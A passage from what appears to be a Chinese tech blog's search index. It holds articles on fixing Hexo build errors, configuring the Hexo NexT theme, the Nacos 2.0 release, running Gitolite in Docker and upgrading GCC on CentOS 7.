${DIR}/nprogress/nprogress.jscurl https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css --create-dirs -o ${DIR}/nprogress/nprogress.csscurl https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js --create-dirs -o ${DIR}/ribbon.js/dist/ribbon.min.js 常见问题问题一完成上述升级操作后，执行 hexo generator 命令后，themes/next/scripts/events/lib/vendors.js 的代码里面抛出以下错误信息： 1234567891011121314151617181920INFO Start processingFATAL { err: TypeError: Cannot read property \'call\' of undefined at module.exports (/usr/local/hexo-develop/themes/next/scripts/events/lib/vendors.js:27:25) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/themes/next/scripts/events/index.js:9:27) at Hexo.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/node_modules/bluebird/js/release/method.js:15:34) at /usr/local/hexo-develop/node_modules/hexo/lib/extend/filter.js:67:52 at tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromiseCtx (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:641:10) at _drainQueueStep (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:97:12) at _drainQueue (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:86:9) at Async._drainQueues (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:102:5) at Immediate.Async.drainQueues [as _onImmediate] (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:15:14) at processImmediate (internal/timers.js:461:21) 这一般是 Hexo 的部分模块没有成功更新引起，例如 hexo-util 模块更新失败，最终导致代码不兼容。首先检查 hexo-util 模块的版本，然后可以尝试执行以下命令，强制更新 hexo-util 模块 12345# 进入博客的主题目录$ cd /boot-root/# 强制更新$ npm update --save --force 问题二完成上述升级操作后，执行 hexo generator 命令后，Hexo 会抛出以下错误信息： 123456789101112131415161718192021222324FATAL { err: TypeError: line.matchAll is not a function at res.value.res.value.split.map.line (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:128:26) at Array.map (&lt;anonymous&gt;) at closeTags (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:126:37) at highlight (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:119:10) at highlightUtil (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:23:16) at data.content.dataContent.replace (/usr/local/hexo-develop/node_modules/hexo/lib/plugins/filter/before_post_render/backtick_code_block.js:92:17) at String.replace (&lt;anonymous&gt;) at Hexo.backtickCodeBlock (/usr/local/hexo-develop/node_modules/hexo/lib/plugins/filter/before_post_render/backtick_code_block.js:19:30) at Hexo.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/node_modules/bluebird/js/release/method.js:15:34) at Promise.each.filter (/usr/local/hexo-develop/node_modules/hexo/lib/extend/filter.js:67:52) at tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromise0 (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:649:10) at Promise._settlePromises (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:729:18) at _drainQueueStep (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:93:12) at _drainQueue (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:86:9) NodeJS 从 12.0.0 才开始支持函数 String.matchAll()，如果 NodeJS 的版本低于 12.0.0，那么执行 Hexo 的构建命令就会出现上述的错误，解决方法如下： 方法一：将 NodeJs 升级到高于 12.0.0 的版本 方法二：更改 Hexo 的配置文件 _config.yml，禁用 highlight 的功能，这样就可以避免出错，但这将会关闭代码的高亮显示功能 12highlight: enable: false var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Docker 基于 Gitolite 搭建 Git 服务器",url:"/posts/4da97727.html",text:'前言官方教程 Docker Install Gitolite Centos7 使用 Gitolite 搭建 Git 服务器 镜像数据卷目录 目录 用途 /home/git/repositories 存储实际的 Git 仓库 /etc/ssh 存储 SSH 主机密钥 Docker 安装 Gitolite这里直接使用国外开发者构建好的 Docker 镜像 elsdoerfer/gitolite，不再通过手写 Dockerfile 来构建 Gitolite，具体使用方法如下： 12# 拉取镜像# docker pull elsdoerfer/gitolite:latest var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化 版本控制"},{title:"Nacos 2.0 发布，性能提升 10 倍",url:"/posts/57722de1.html",text:'前言继 Nacos 1.0 发布以来，Nacos 迅速被成千上万家企业采用，并构建起强大的生态。但是随着用户深入使用，逐渐暴露一些性能问题，因此启动了 Nacos 2.0 的隔代产品设计，时隔半年终于将其全部实现，实测性能提升 10 倍，相信能满足所有用户的性能需求。 Nacos 简介Nacos 是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。它孵化于阿里巴巴，成长于十年双十一的洪峰考验，沉淀了简单易用、稳定可靠、性能卓越的核心竞争力。 Nacos 2.0 架构2021 年 03 月 30 日，Nacos 2.0 正式对外发布。全新的 2.0 架构不仅将性能大幅提升 10 倍，而且内核进行了分层抽象，并且实现插件扩展机制。Nacos 2.0 架构层次如下图，它相比 Nacos 1.X 的最主要变化是： 通信层统一到 gRPC 协议，同时完善了客户端和服务端的流量控制和负载均衡能力，提升的整体吞吐。 将存储和一致性模型做了充分抽象分层，架构更简单清晰，代码更加健壮，性能更加强悍。 设计了可拓展的接口，提升了集成能力，如让用户扩展实现各自的安全机制。 Nacos 2.0 服务发现升级一致性模型Nacos 2.0&nbsp;架构下的服务发现，客户端通过 gRPC，发起注册服务或订阅服务的请求。服务端使用 Client 对象来记录该客户端使用 gRPC 连接发布了哪些服务，又订阅了哪些服务，并将该 Client 进行服务间同步。由于实际的使用习惯是服务到客户端的映射，即服务下有哪些客户端实例；因此 2.0 的服务端会通过构建索引和元数据，快速生成类似 1.X 中的 Service 信息，并将 Service 的数据通过 &nbsp;gRPC Stream 进行推送。 Nacos 2.0 配置管理升级通信机制配置管理之前用 Http1.1 的 Keep Alive 模式 30s 发一个心跳模拟长链接，协议难以理解，内存消耗大，推送性能弱，因此 2.0 通过 gRPC 彻底解决这些问题，内存消耗大量降低。 Nacos 2.0 架构优势 Nacos 2.0 大幅降低了资源消耗，提升吞吐性能，优化客户端和服务端交互，对用户更加友好；虽然可观测性略微下降，但是整体性价比非常高。 Nacos 2.0 性能提升由于 Nacos 由服务发现和配置管理两大模块构成，业务模型略有差异，因此下面分别介绍一下具体压测指标。 Nacos 2.0 服务发现的性能提升服务发现场景主要关注客户端数，服务数实例数，及服务订阅者数在大规模场景下，服务端在同步，推送及稳定状态时的性能表现。同时还关注在有大量服务在进行上下线时，系统的性能表现。 容量及稳定状态测试 该场景主要关注随着服务规模和客户端实例规模上涨，系统性能表现。 可以看到 2.0.0 版本在 10W 级客户端规模下，能够稳定的支撑，在达到稳定状态后，CPU 的损耗非常低。虽然在最初的大量注册阶段，由于存在瞬时的大量注册和推送，因此有一定的推送超时，但是会在重试后推送成功，不会影响数据一致性。反观 1.X 版本，在 10W、5W 级客户端下，服务端完全处于 Full GC 状态，推送完全失败，集群不可用；在 2W 客户端规模下，虽然服务端运行状态正常，但由于心跳处理不及时，大量服务在摘除和注册阶段反复进行，因此达不到稳定状态，CPU 一直很高。1.2W 客户端规模下，可以稳定运行，但稳态时 CPU 消耗是更大规模下 2.0 的 3 倍以上。 频繁变更测试 该场景主要关注业务大规模发布，服务频繁推送条件下，不同版本的吞吐和失败率。 频繁变更时，2.0 和 1.X 在达到稳定状态后，均能稳定支撑，其中 2.0 由于不再有瞬时的推送风暴，因此推送失败率归 0，而 1.X 的 UDP 推送的不稳定性导致了有极小部分推送出现了超时，需要重试推送。 Nacos 2.0 配置管理的性能提升由于配置是少写多读场景，所以瓶颈主要在单台监听的客户端数量以及配置的推送获取上，因此配置管理的压测性能主要集中于单台服务端的连接容量以及大量推送的比较。 Nacos 2.0 连接容量测试 该场景主要关注不同客户端规模下的系统压力。 Nacos 2.0 最高单机能够支撑 4.2w 个配置客户端连接，在连接建立的阶段，有大量订阅请求需要处理，因此 CPU 消耗较高，但达到稳态后，CPU 的消耗会变得很低，几乎没有消耗。反观 Nacos 1.X，在客户端 6000 时，稳定状态的 CPU 一直很高，且 GC 频繁，主要原因是长轮训是通过 hold 请求来保持连接，每 30s 需要回一次 Response 并且重新发起连接和请求。需要做大量的上下文切换，同时还需要持有所有 Request 和 Response。当规模达到 1.2w 客户端时，已经无法达到稳态，所以无法支撑这个量级的客户端数。 Nacos 2.0 频繁推送测试 该场景关注不同推送规模下的系统表现。 在频繁变更的场景，两个版本都处于 6000 个客户端连接中。明显可以发现 2.0 版本的性能损耗要远低于 1.X 版本。在 3000tps 的推送场景下，优化程度约优化了 3 倍。 Nacos 2.0 性能结论 针对服务发现场景，Nacos 2.0 能够在 10W 级规模下，稳定运行；相比 Nacos 1.X 版本的 1.2W 规模，提升约 10 倍。 针对配置管理场景，Nacos 2.0 单机最高能够支撑 4.2W 个客户端连接；相比 Nacos 1.X，提升了 7 倍，且推送时的性能明显好于 1.X。 Nacos 生态及 2.X 后续规划随着 Nacos 三年的发展，几乎支持了所有的 RPC 框架和微服务生态，并且引领云原生微服务生态发展。 Nacos 是整个微服务生态中非常核心的组件，它可以无缝和 K8s 服务发现体系互通，通过 MCP/XDS 协议与 Istio 通信，将 Nacos 服务下发 Sidecar；同样也可以和 CoreDNS 联合，将 Nacos 服务通过域名模式暴露给下游调用。Nacos 目前已经和各类微服务 RPC 框架融合进行服务发现；另外可以协助高可用框架 Sentinel 进行各类管理规则的控制和下发。 如果只使用 RPC 框架，有时候并不足够简单，因为部分 RPC 框架比如 gRPC 和 Thrift，还需要自行启动 Server 并告知 Client 该调用哪个 IP。这时候就需要和应用框架进行融合，比如 SCA、Dapr 等；当然也可以通过 Envoy Sidecar 来进行流量控制，应用层的 RPC 就不需要知道服务 的 IP 列表了。最后，Nacos 还可以和各类微服务网关打通，实现接入层的分发和微服务调用。 Nacos 生态在阿里的实践目前 Nacos 已经完成了自研、开源、商业化三位一体的建设，阿里内部的钉钉、考拉、饿了么、优酷等业务域已经全部采用云产品 MSE 中的 Nacos 服务，并且与阿里和云原生的技术栈无缝整合。下面以钉钉为例简单做一下介绍。 Nacos 运行在微服务引擎 MSE（全托管的 Nacos 集群）上，进行维护和多集群管理；业务的各类 Dubbo3 或 HSF 服务在启动时，通过 Dubbo3 自身注册到 Nacos 集群中；然后 Nacos 通过 MCP 协议将服务信息同步到 Istio 和 Ingress-Envoy 网关。 用户流量从北向进入集团的 VPC 网络中，先通过一个统一接入 Ingress-Tengine 网关，他可以将域名解析并路由到不同的机房、单元等。本周也同步更新了 Tengine 2.3.3 版本，内核升级到 Nginx Core 1.18.0 ，支持 Dubbo 协议 ，支持 DTLSv1 和 DTLSv1.2，支持 Prometheus 格式，从而提升阿里云微服务生态完整性、安全性、可观测性。 通过统一接入层网关后，用户请求会通过 Ingress-Envoy 微服务网关，转发到对应的微服务中，并进行调用。如果需要调用到其他网络域的服务，会通过 Ingress-Envoy 微服务网关将流量导入到对应的 VPC 网络中，从而打通不同安全域、网络域和业务域的服务。 微服务之间的相互调用，会通过 Envoy Sidecar 或传统的微服务自订阅的方式进行。最终，用户请求在各个微服务的互相调用中，完成后并返回给用户。 Nacos 2.X 的规划Nacos 2.X 将在 2.0 解决性能问题的基础上，通过插件化实现新的功能并改造大量旧功能，使得 Nacos 能够更方便，更易于拓展。 总结Nacos 2.0 作为一个跨代版本，彻底解决了 Nacos 1.X 的性能问题，将性能提升了 10 倍。并且通过抽象和分层让架构更加简单，通过插件化更好的扩展，让 Nacos 能够支持更多场景，融合更广生态。相信 Nacos2.X 在后续版本迭代后，会更加易用，解决更多微服务问题，并向着 Mesh 化进行更深入地探索。 Nacos：https://nacos.io/zh-cn Nacos Github：https://github.com/alibaba/nacos var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Hexo Next 主题详细配置之二",url:"/posts/fef9e726.html",text:'前言官方教程 Next 官方教程 - 常见问题 Next 官方教程 - 内置标签 Next 官方教程 - 第三方服务集成 版本说明本文使用各软件的版本如下： 软件 版本 hexo 3.9.0 hexo-cli 2.0.0 next 7.8 Next 第三方服务集成 百度统计集成 登录 百度统计，定位到站点的代码获取页面 复制 hm.js? 后面那串统计脚本 id，如下图所示 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1baidu_analytics: \'tug63d4s3hlw9lz2hdtfwhtl0rxay\' Next 主题自带的百度统计脚本，默认会将博客本地访问记录也统计进去，例如通过 127.0.0.1 或者 localhost 访问博客 更改 themes/next/layout/_third-party/analytics/baidu-analytics.swig 文件，替换为以下内容 1234567891011121314{%- if theme.baidu_analytics %} &lt;script{{ pjax }}&gt; var _hmt = _hmt || []; (function() { var host = window.location.host; if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?{{ theme.baidu_analytics }}"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); } })(); &lt;/script&gt;{%- endif %} 谷歌统计集成更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123google_analytics: tracking_id: \'UA-949648306-1\' only_pageview: false Next 主题自带的谷歌统计脚本，默认会将博客本地访问记录也统计进去，例如通过 127.0.0.1 或者 localhost 访问博客 更改 themes/next/layout/_third-party/analytics/google-analytics.swig 文件，替换为以下内容 123456789101112131415161718192021222324252627282930313233{%- if theme.google_analytics.tracking_id %} {%- if not theme.google_analytics.only_pageview %} &lt;script async src="https://www.googletagmanager.com/gtag/js?id={{ theme.google_analytics.tracking_id }}"&gt;&lt;/script&gt; &lt;script{{ pjax }}&gt; var host = window.location.host; window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { gtag(\'js\', new Date()); gtag(\'config\', \'{{ theme.google_analytics.tracking_id }}\'); } &lt;/script&gt; {%- endif %} {%- if theme.google_analytics.only_pageview %} &lt;script&gt; function sendPageView() { if (CONFIG.hostname !== location.hostname) return; var uid = localStorage.getItem(\'uid\') || (Math.random() + \'.\' + Math.random()); localStorage.setItem(\'uid\', uid); navigator.sendBeacon(\'https://www.google-analytics.com/collect\', new URLSearchParams({ v : 1, tid: \'{{ theme.google_analytics.tracking_id }}\', cid: uid, t : \'pageview\', dp : encodeURIComponent(location.pathname) })); } document.addEventListener(\'pjax:complete\', sendPageView); sendPageView(); &lt;/script&gt; {%- endif %}{%- endif %} 百度自动推送集成更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1baidu_push: true Next 主题自带的百度自动推送脚本，默认在本地访问博客时也会自动推送，例如通过 127.0.0.1 或者 localhost 访问博客 更改 themes/next/layout/_third-party/baidu-push.swig 文件，替换为以下内容 123456789101112131415161718{%- if theme.baidu_push %} &lt;script{{ pjax }}&gt; (function() { var host = window.location.host; if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { var bp = document.createElement(\'script\'); var curProtocol = window.location.protocol.split(\':\')[0]; if (curProtocol === \'https\') { bp.src = \'https://zz.bdstatic.com/linksubmit/push.js\'; } else { bp.src = \'http://push.zhanzhang.baidu.com/push.js\'; } var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bp, s); } })(); &lt;/script&gt;{%- endif %} Utterances 评论插件集成Utterances 的原理和 Gitment、Gitalk 类似，依赖 Github Issue，但是索取的权限更少。首先在 Github 创建新的仓库，同时为 Utterances 在 Github 上授权，让 Utterances 有权限访问新仓库的 Issue。当然也可以单独指定 Utterances 能够访问的仓库，可见其权限控制做的非常好，具体操作这里不再累述。下面给出的是 Next 安装 Utterances 评论插件的方法与相关配置内容。 12345# 进入博客的根目录$ cd ${blog-root}/# 安装插件$ npm install github:theme-next/hexo-next-utteranc --save 更改 Next 主题的配置文件 themes/next/_config.yml，添加以下内容 1234567utteranc: enable: true repo: xxxx/xxxx # Github repo such as :TrumanDu/comments pathname: pathname theme: github-light # theme: github-light, github-dark, github-dark-orange cdn: https://utteranc.es/client.js priority: # If you want to modify priority, please config in **hexo** 配置完成后，每篇文章的底部都会自动新增评论区，效果图如下： Next 使用本地字体由于 Next 默认是调用 Google Fonts API 来设置字体，正如 Next 官方所说的那样，Google Fonts API 并不稳定。对于这种情况，部分解决方案是 Google Fonts API 指向国内的镜像。但这种方式并不稳定，更好的方式是，将字体下载到站点中，再在站点里使用绝对路径的方式引用字体，相关教程如下： Next 官方设置字体教程 Next 主题字体下载与使用本地字体 当字体下载到本地站点后，更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容，由于使用了本地字体，不再使用 Google Fonts 的在线字体，因此统一设置 external: false 123456789101112131415161718192021222324252627282930313233font: enable: true # 外链字体库地址，例如 https://fonts.googleapis.com (默认值) host: https://fonts.googleapis.com # 全局字体，应用在 body 元素上 global: external: false family: Lato size: 16px # 站点标题字体 title: external: false family: size: # 页头标题字体 (h1, h2, h3, h4, h5, h6) headings: external: false family: Roboto Slab size: # 文章字体 posts: external: false family: # 代码字体，应用于 code 以及代码块 codes: external: false family: Roboto Mono var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Centos7 升级 GCC 版本",url:"/posts/4a5f9755.html",text:'前言 本文主要介绍如何在 Centos 7 系统环境下升级 GCC 的版本，适用于部分源码包依赖高版本的 GCC 进行编译的场景。 安装 SCL SCL 可以在不覆盖原有软件包的情况下与其共存，缺点就是仅支持 64 位 SCL 仅支持安装 devtoolset-4（GCC 5.2）（不含）之后的 GCC 版本 1# yum install -y centos-release-scl 安装 GCC 使用以下命令安装 GCC，其中的 9 表示大版本号，默认安装大版本下的最新稳定版本 1# yum install -y devtoolset-9 scl-utils-build 启用 GCC 临时启用：使用以下命令临时启用 GCC，这种方式适用于临时切换系统的 GCC 版本，即开即用，仅在当前 bash 中有效 1# scl enable devtoolset-9 bash 永久启用：使用以下命令永久启用 GCC，这种方式适用于长期使用该版本进行编译，切换 bash 依然有效 1# echo "source /opt/rh/devtoolset-9/enable" &gt;&gt; /etc/profile &amp;&amp; souce /etc/profile 查看 GCC 版本 1# gcc --version var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Hexo Next 主题详细配置之一",url:"/posts/755ff30d.html",text:'前言 Next 官方教程 - 开始使用 Next 官方教程 - 主题配置 Next 官方教程 - 常见问题 Next 安装版本说明本文使用各软件的版本如下： 软件 版本 hexo 3.9.0 hexo-cli 2.0.0 next 7.8 Next 各版本的介绍值得一提的是，Next 不同版本使用的是不同的仓库，各版本的仓库如下： 年份 版本 仓库 2014 ~ 2017 v5 https://github.com/iissnan/hexo-theme-next 2018 ~ 2019 v6 ~ v7 https://github.com/theme-next/hexo-theme-next 2020 v8 https://github.com/next-theme/hexo-theme-next Next 主题与 Hexo 的版本兼容如下： Next 主题安装 7.x 版本克隆整个 Next 仓库，这里使用 Next 7.x 版本 12# 克隆代码（Next不同版本使用不同仓库）$ git clone https://github.com/theme-next/hexo-theme-next themes/next 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1theme: next 日后可以随时使用 Git 更新当前 Next 的版本，并切换到任何带标签的版本，或者切换到最新的 master 或任何其他分支。在大多数情况下，这对用户和开发人员都有用。 123456789101112131415161718# 进入主题目录$ cd themes/next# 查看带标签的版本$ git tag -lv6.0.0v6.0.1v6.0.2…# 切换到特定标签的版本$ git checkout tags/v6.0.1# 重新切换为master分支$ git checkout master# 更新代码$ git pull Next 常规配置PDF 显示Next 默认支持 PDF 自定义标签，使用格式为： {% pdf https://www.example.com/spring.pdf %}。若希望启用 PDF 的支持，需要更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容，详见官方文档 1234pdf: enable: true # Default height height: 550px 首页像显示头更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1234avatar: url: /images/avatar.png # 头像图片 rounded: true # 头像显示在圆里 rotated: true # 鼠标焦点落在头像时，是否转动头像 菜单显示中文在博客的根目录里，找到 _config.yml 文件，然后设置以下的配置项，值得一提的是，这里的字体是 zh-CN，而不是 zh-Hans 1language: zh-CN 启用文章目录更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123456toc: enable: true number: false # 自动添加目录编号 wrap: true # 每行目录字数超长自动换行 expand_all: true # 展开所有级别 max_depth: 5 # 目录的最大深度 启用文章打赏更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容，需要将收款二维码图片放到 themes/next/source/images 文件夹下，或者使用自定义的图片目录路径 12345678reward_settings: enable: true animation: false comment: 坚持原创技术分享，您的支持将鼓励我继续创作！reward: wechatpay: /images/wechatpay.png alipay: /images/alipay.png 添加版权声明更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345creative_commons: license: by-nc-sa # License类型： by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero sidebar: false # 在侧边栏有一个版权的图片链接 post: true # 在每一篇文章末尾自动增加本文作者、本文链接、版权声明信息 language: deed.zh # 点击链接后显示的版权信息的语言 如果需要自定义文章底部版权信息的，可以自行修改 themes/next/layout/_partials/post/post-copyright.swig 模版文件来实现 添加标签页面通过 Hexo 创建一个标签页面 12345# 进入博客的根目录$ cd ${blog-root}/# 创建标签页$ hexo new page tags 创建完标签页后，发现 source 文件夹下会多了 tags/index.md 文件，这个文件是用于显示站点内所有分类标签的，复制以下内容到 tags/index.md 中，必须使用 --- 包裹配置内容，否则配置无效 123456---title: 标签type: "tags"comments: falsedate: 2021-04-05 17:13:00--- 若博客有集成评论服务，标签页面也会带有评论，需要关闭的话，请添加字段 comments 并将值设置为 false 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12menu: tags: /tags/ || fa fa-tags 添加网站备案号更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123beian: enable: true icp: \'粤ICP备19024664号\' 启用不蒜子统计更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345678busuanzi_count: enable: true total_visitors: true total_visitors_icon: fa fa-user total_views: true total_views_icon: fa fa-eye post_views: true post_views_icon: fa fa-eye 首页不显示文章描述摘录Next 主题默认会在首页里将文章描述摘录为前言文本，但在首页显示一篇文章的部分内容，并提供一个链接跳转到全文页面是一个常见的需求。 NexT 提供三种方式来控制文章在首页的显示方式，也就是说，在首页显示文章的摘录并显示 阅读全文 按钮，可以更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1excerpt_description: false 建议使用 &lt;!-- more --&gt;，除了可以精确控制需要显示的摘录内容以外，这种方式也可以让 Hexo 中的插件更好的识别 Next 进阶配置启用 PjaxPjax 主要用于加速 Web 页面的切换速度，同时也可以用来解决 Aplayer 音频播发器切换页面后播放出现中断的问题 12345# 进入Next主题的目录$ cd themes/next# 下载资源文件$ git clone https://github.com/theme-next/theme-next-pjax source/lib/pjax 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1pjax: true 启用背景 3D 动画Next 主题默认支持 3D 背景动画，官方配置教程可以看这里，前提是需要下载指定的静态资源文件或者使用 CDN 静态资源文件 12345# 进入Next主题的目录$ cd themes/next# 下载3D资源文件$ git clone https://github.com/theme-next/theme-next-three source/lib/three 或者更改 Next 主题的配置文件 themes/next/_config.yml，通过以下配置内容来指定 CDN 静态资源文件的 URL 12345vendors: three: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js three_waves: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js canvas_lines: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_lines.min.js canvas_sphere: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_sphere.min.js 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345three: enable: true three_waves: true # 背景3D动画样式一 canvas_lines: false # 背景3D动画样式二 canvas_sphere: false # 背景3D动画样式三 启用图片点击居中预览更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1mediumzoom: true 启用 Canvas Ribbon 背景Next 主题默认支持 Canvas Ribbon 背景，官方配置教程可以看这里，前提是需要下载指定的静态资源文件或者使用 CDN 静态资源文件 12345# 进入Next主题的目录$ cd themes/next# # 下载Canvas资源文件$ git clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon 或者更改 Next 主题的配置文件 themes/next/_config.yml，通过以下配置内容来指定 CDN 静态资源文件的 URL 12vendors: canvas_ribbon: //cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345canvas_ribbon: enable: true size: 300 # Ribbon的宽度 alpha: 0.6 # Ribbon的透明度 zIndex: -1 # Ribbon的显示级别 添加页面顶部加载进度条12345# 进入Next主题的目录$ cd themes/next# 克隆代码$ git clone https://github.com/theme-next/theme-next-pace source/lib/pace 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123pace: enable: true theme: minimal 添加页面顶部阅读进度条12345# 进入Next主题的目录$ cd themes/next# 克隆代码$ git clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12345reading_progress: enable: true position: top # 进度条的位置：top | bottom color: "#37c6c0" # 进度条的颜色 height: 3px # 进度条的大小 显示侧栏阅读进度百分比更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1234back2top: enable: true sidebar: false scrollpercent: true Next 页面样式更改超链接样式打开 CSS 文件 themes/next/source/css/_common/components/post/post.styl，在末尾添加以下 CSS 样式，颜色可自定义，在这里超链接选中状态为橙色，链接样式为蓝色 12345678910.post-body p a{ color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover { color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; }} 代码块高亮样式更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123456codeblock: highlight_theme: \'night eighties\' # 代码高亮可选样式: normal | night | night eighties | night blue | night bright | solarized | solarized dark | galactic copy_button: enable: true # 